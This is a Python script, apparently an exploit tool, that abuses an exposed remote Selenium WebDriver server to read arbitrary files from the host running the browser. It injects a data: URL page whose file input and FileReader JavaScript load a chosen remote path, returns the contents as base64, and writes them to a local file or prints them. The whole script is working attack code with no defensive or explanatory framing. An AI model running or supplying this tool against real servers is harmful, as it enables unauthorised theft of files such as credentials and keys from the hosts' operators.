import base64, getopt, sys
from selenium import webdriver
from selenium.webdriver.remote.file_detector import UselessFileDetector

def get_file_contents(driver, remote_file):
    " A simple file input plus some FileReader js to store file contents in 'inf' "
    decoded_contents = None
    try:
        driver.get('data:text/html;charset=utf-8,<html><input id=f type=file onchange="rf(event)"><script>var inf; var rf = function(e) { var inp = e.target; var read = new FileReader(); read.onload = function(){inf = read.result;}; read.readAsDataURL(inp.files[0]);}</script></html>')
        driver.find_element_by_id('f').send_keys(remote_file) # Load local file into input field (and therefor "inf")
        js_return = driver.execute_script('return(inf)')   # Dump the contents of "inf"
        if js_return:
            try:
                decoded_contents = base64.b64decode(js_return.split(',')[1])
            except:
                print('Cannot Decode: %s' % js_return)
        else:
            print('Cannot Read: %s' % remote_file)
    except:
        print('Doesnt Exist: %s' % remote_file)
    return decoded_contents

def write_local_file(local_file, file_contents):
    " Simply write to a local binary file "
    try:
        f = open(local_file, 'w+b')
        f.write(file_contents)
        f.close()
    except:
        print('Cannot Write the following File: %s' % local_file)
    return None

def get_driver(url):
    driver = webdriver.Remote(
            command_executor=url,
            desired_capabilities={'browserName': 'firefox'}
            )
    driver.file_detector = UselessFileDetector()
    return driver

def parse_args():
    url_wd, remote_file, local_file = None, None, None
    myopts, args = getopt.getopt(sys.argv[1:],':r:u:l:')
    for o, a in myopts:
        if o == '-u':
            url_wd = a
        elif o == '-r':
            remote_file = a
        elif o == '-l':
            local_file = a

    return url_wd, remote_file, local_file

if __name__ == '__main__':
    url_wd, remote_file, local_file = parse_args()
    driver = get_driver(url_wd)
    try:
        file_contents = get_file_contents(driver, remote_file)
        if local_file:
            write_local_file(local_file, file_contents)
        else:
            print(file_contents.decode('ascii'))
    finally:
        driver.quit()
    sys.exit(0)
